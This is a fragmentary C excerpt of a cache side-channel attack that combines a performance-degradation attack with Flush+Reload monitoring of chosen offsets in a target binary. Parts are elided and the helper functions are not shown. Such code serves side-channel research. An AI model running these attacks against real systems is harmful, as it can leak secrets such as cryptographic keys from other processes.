/* Performance degredation attack, combined with Flush+Reload */
...
int main(int ac, char **av) {
  ...
  fr_t fr = fr_prepare();
  pda_t* pda = calloc(nmonitor, sizeof(pda_t));
  for (int i = 0; i < nmonitor; i++) {
    ...
    void *m_offset = map_offset(binary, offset);
    fr_monitor(fr,  m_offset);
    pda_target(pda[i], m_offset);
    pda_activate(pda[i]);  
  }
